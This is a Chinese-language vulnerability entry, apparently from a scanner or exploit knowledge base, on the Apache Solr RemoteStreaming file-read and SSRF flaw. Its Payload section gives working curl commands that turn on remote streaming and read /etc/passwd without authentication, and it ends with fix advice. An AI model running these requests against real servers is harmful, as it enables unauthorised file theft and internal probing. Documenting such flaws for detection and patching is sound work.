---
id: SOLR-REMOTE-STREAMING-FILEREAD
title: Apache Solr RemoteStreaming 任意文件读取和SSRF漏洞
product: solr
vendor: Apache
version_affected: "< 8.8.2"
severity: HIGH
tags: [ssrf, file_read, 无需认证]
fingerprint: ["Apache Solr", "Solr", "RemoteStreaming"]
---

## 漏洞描述

Apache Solr 是一个开源的搜索服务器。当 Apache Solr 未启用身份认证时，攻击者可以构造请求来启用特定配置，从而可能导致服务器端请求伪造（SSRF）或任意文件读取漏洞。

## 影响版本

- Apache Solr < 8.8.2

## 前置条件

- 无需认证
- 需要能够访问 Solr API（默认 8983 端口）

## 利用步骤

1. 获取数据库名
2. 启用 RemoteStreaming 配置
3. 利用 stream.url 读取任意文件或进行 SSRF

## Payload

```bash
# 获取核心名
curl "http://target:8983/solr/admin/cores?indexInfo=false&wt=json"

# 启用 RemoteStreaming
curl -X POST -H "Content-Type: application/json" --data-binary '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' "http://target:8983/solr/demo/config"

# 读取任意文件
curl "http://target:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd"
```

## 验证方法

```bash
# 成功读取 /etc/passwd 即证明漏洞存在
```

## 修复建议

1. 升级 Apache Solr 至 8.8.2+
2. 启用 Solr 身份认证
3. 禁用 RemoteStreaming 功能
